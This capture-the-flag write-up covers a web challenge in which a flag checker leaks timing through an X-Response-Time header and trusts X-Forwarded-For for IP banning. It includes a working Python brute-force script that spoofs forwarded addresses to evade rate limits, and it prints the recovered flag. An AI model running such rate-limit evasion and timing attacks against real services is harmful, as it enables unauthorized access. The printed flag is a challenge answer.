**Category:** Web  
**Author**: Soups71

![](./files/01%20-%20Flag%20Checker/01%20-%20Flag%20Checker.png)

---

I found this challenge to be incredibly fun. The challenge instance hosted a web application with a single input box for the flag and a button to submit it via GET. No matter what was entered, the response `Not quite!` was always returned. After too many attempts I was IP banned and prevented from continuing.

![](./files/01%20-%20Flag%20Checker/01.png)

I decided to port scan the instance and discovered that both ports 80 and 5000 were available. Both ports displayed the same page, but the response headers varied; port 80 responded with `Server: nginx/1.24.0 (Ubuntu)`, while port 5000 responded with `Server: Werkzeug/3.1.3 Python/3.11.13`. This is a common setup and presumably nginx was configured to forward traffic from port 80 to 5000.

Attempting to submit a flag via port 5000 displayed the following error message and confirmed my theory:

![](./files/01%20-%20Flag%20Checker/02.png)

This was the first piece of the puzzle. I found that the server would accept arbitrary `X-Forwarded-For` values and that the rate limiting/IP banning system was based on the value provided. Thus, continuously altering my `X-Forwarded-For` header allowed me to bypass rate limiting entirely. It was at this point that I noticed the response headers also included `X-Response-Time`, which made me suspect the key to this challenge was a timing attack. I was able to confirm this by comparing the `X-Response-Time` values returned for flag inputs of `test` and `flag`, which yielded `0.001151` and `0.401721`, respectively.

I then wrote the following Python script to brute force the entire flag value.

```Python
#!/usr/bin/env python3
import requests
import sys

def solve(host):
    network = []

    for a in range(256):
        for b in range(256):
            network.append("172.0.%i.%i" % (a, b))

    url = "http://%s:5000/submit?flag=" % host
    
    res = requests.get(url, headers={"X-Forwarded-For" : str(network.pop())})
    base = float(res.headers.get("X-Response-Time"))

    flag = ""

    while len(flag) < 38:
        for char in "0123456789abcdeflag{}":
            res = requests.get(url + flag + char, headers={"X-Forwarded-For" : str(network.pop())})
            
            page = res.content.decode().lower()
            time = float(res.headers.get("X-Response-Time"))
            
            if (time - base) >= 0.05 and ("hacking" not in page):
                base = time
                flag += char
                print(round(base, 3), flag)
                break
    
def usage():
    print("Usage: %s <host>" % sys.argv[0])
    sys.exit()
    
def main():
    if len(sys.argv) < 2:
        usage()
        
    solve(sys.argv[1])
    
if __name__ == "__main__":
    main()
```

![](./files/01%20-%20Flag%20Checker/03.png)

Flag: **flag{77ba0346d9565e77344b9fe40ecf1369}**

---

**Files:**
- [solve.py](./files//01%20-%20Flag%20Checker/solve.py)